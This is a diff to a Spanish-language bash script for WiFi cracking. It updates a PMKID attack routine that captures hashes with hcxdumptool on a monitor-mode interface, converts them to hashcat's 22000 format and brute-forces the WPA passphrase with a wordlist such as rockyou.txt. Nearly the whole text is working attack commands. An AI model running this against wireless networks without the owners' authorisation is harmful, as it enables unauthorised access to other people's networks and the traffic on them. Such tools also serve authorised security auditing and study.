@@ -123,19 +123,22 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								2)
 								echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
 								sleep 1 
-								xterm -hold -e "hcxdumptool -i ${tar}mon --enable_status=1 -o Hash" &
+								read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
+								xterm -hold -e "hcxdumptool -i ${tar}mon -o HashPKMID.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 								hcxcaptool_PID=$!
-								sleep 60; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID
+								sleep ${seg}; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID 2>/dev/null
 								echo -e "\n${redColour} [%] Capturando Hashes\n"
 								sleep 2
-								hcxcaptool -z Hashes Hash; rm Hash 2>/dev/null
-								test -f  Hashes
+								$cleancolor
+								test -f HashPKMID*
 								if [ "$(echo $?)" == "0" ]; then
 									echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
 									sleep 1
 									echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 									read -p "[?] Ruta del Diccionario al usar: " dicc1
-									hashcat -m 16800 $dicc1 Hashes -d 1 --force 
+									echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
+									hcxpcapngtool -o HPKMID.hc22000 -E essidlist HashPKMID.pcapng > /dev/null 2>&1
+									hashcat -m 22000 $dicc1 HPKMID.hc22000 -d 1 --force
 								else 
 									echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
 									exit
